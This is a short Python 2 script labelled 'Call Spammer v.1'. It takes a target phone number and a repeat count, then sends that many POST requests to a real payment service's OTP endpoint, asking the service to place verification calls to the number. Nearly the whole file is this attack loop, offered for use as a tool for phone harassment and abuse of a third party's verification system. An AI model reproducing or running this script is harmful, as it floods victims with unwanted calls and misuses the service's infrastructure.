#!/usr/bin/python
#-*-coding:utf-8-*-
banner="""
              * ************************************ *
              * Call Spammer v.1                     *
              * Coded By : MRK404                    *
              * Team     : INDSEC                    *
              * Github   : https://github.com/mrk404 *
              * Facebook :facebook/MRK404            *
              * ************************************ *
"""
import sys,requests,os


os.system('clear')

def callpam():
	print banner
	nomor=sys.argv[1]
	ulang=sys.argv[2]
	numb=int(ulang)
	param = {'msisdn':nomor,'accept':'call'}
	count = 0
	while (count < numb):
                a = count +1
		r = requests.post('https://www.tokocash.com/oauth/otp', param)
		if "otp_attempt_left" in r.text:
			print "[%s] send succes"%a
		else:
			print "[%s] send failed "%a
		count=count+1
if __name__ == "__main__":
	if len(sys.argv) !=3:
		print __banner__
		print "[-] Ussage: python "+sys.argv[0]+" number count"
		print "[+] Example : python "+sys.argv[0]+" 0895353xxx 10"
		sys.exit
	else:
		callpam()
